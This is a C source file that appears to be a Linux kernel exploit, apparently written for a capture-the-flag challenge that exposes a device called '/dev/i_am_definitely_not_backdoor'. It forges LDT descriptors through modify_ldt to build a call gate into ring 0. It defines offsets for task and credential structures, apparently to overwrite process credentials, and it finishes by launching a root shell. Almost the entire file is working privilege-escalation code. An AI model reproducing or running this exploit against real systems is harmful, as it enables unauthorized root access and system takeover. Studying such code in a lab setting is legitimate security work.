#include <asm/ldt.h>         /* Definition of struct user_desc */
#include <sys/syscall.h>     /* Definition of SYS_* constants */
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
 #include <sys/prctl.h>

struct desc_struct {
	uint16_t	limit0;
	uint16_t	base0;
	uint16_t	base1: 8, type: 4, s: 1, dpl: 2, p: 1;
	uint16_t	limit1: 4, avl: 1, l: 1, d: 1, g: 1, base2: 8;
} __attribute__((packed));

int modify_ldt(int func, void *ptr, unsigned long bytecount)
{
    return syscall(SYS_modify_ldt, func, ptr, bytecount);
}

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

#define TARGET_ENTRY 12
#define __KERNEL_CS   (2 * 8)
#define MSR_LSTAR 0xc0000082
#define KASLR_WRITABLE 0xa00000
#define KASLR_LSTAR 0xa00010
#define KASRL_WRITABLE_END 0xc00000
#define KASLR_WRITE_TO 0xbad000
#define KASLR_INIT_TASK 0x1613940
#define PERCPU_CURRENT 0x1fbc0
#define STRUCT_TASK_STRUCT_REAL_CRED 0x0a78
#define STRUCT_TASK_STRUCT_CRED 0x0a80
#define STRUCT_CRED_USAGE 0x0

char buf[0x1000];

struct user_desc user_desc;
struct user_desc empty_desc;

extern void ring0();

void __attribute__((naked)) ring0_setup()
{
    __asm__(
        "cli;"
        "pushfq;"
        "orq $(1 << 18), (%%rsp);"
        "popfq;"
        "mov %0, %%r15;"
        "jmp %%r15;"
        :
        : "r"(&ring0)
        :
    );
}

void call_call_gate()
{
    // first qword: unused offset
    // next word: selector
    uint32_t selector[] = { 0, 0, (TARGET_ENTRY << 3) | (1 << 2) | 0x3 };

    __asm__(
        ".intel_syntax noprefix;"
        "rex64 call fword ptr [%0];"
        ".att_syntax prefix;"
        :
        : "r"(selector));
}

int main()
{
    static char prog[0x1000];
    int fd2 = open("rules.txt", O_RDONLY);
    read(fd2, prog, sizeof(prog));
    close(fd2);

    prctl(38LL, 1LL, 0LL, 0LL, 0LL);
    prctl(22LL, 2LL, &prog);

    int fd = open("/dev/i_am_definitely_not_backdoor", O_RDWR);
    int result = 0;
    if (fd == -1) {
        ERROR("open(\"/dev/i_am_definitely_not_backdoor\")");
        exit(1);
    }

    mmap(0xc00000, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(0xc00000, &ring0_setup, 0x100);

    user_desc.base_addr = __KERNEL_CS;
    user_desc.limit = 0x1000;
    user_desc.seg_32bit = 1;
    user_desc.contents = 0;
    user_desc.read_exec_only = 0;
    user_desc.limit_in_pages = 0;
    user_desc.seg_not_present = 0;
    user_desc.useable = 0;
    user_desc.lm = 0;

    printf("%lx %lx %lx %lx\n", *(uint64_t *)&empty_desc,  *(uint64_t *)((char *)&empty_desc + 8), *(uint64_t *)&user_desc,  *(uint64_t *)((char *)&user_desc + 8));

    for (int i = 0; i < 16; ++i)
    {
        if (i == TARGET_ENTRY + 1)
        {
            empty_desc.entry_number = i;
            result = modify_ldt(1, &empty_desc, sizeof(empty_desc));
        }
        else
        {
            user_desc.entry_number = i;
            result = modify_ldt(1, &user_desc, sizeof(user_desc));
        }
        if (result < 0) {
            perror("abc");
            return -1;
        }
    }

    write(fd, buf, 100);
    call_call_gate();
    printf("Done\n");
    system("/bin/sh");
}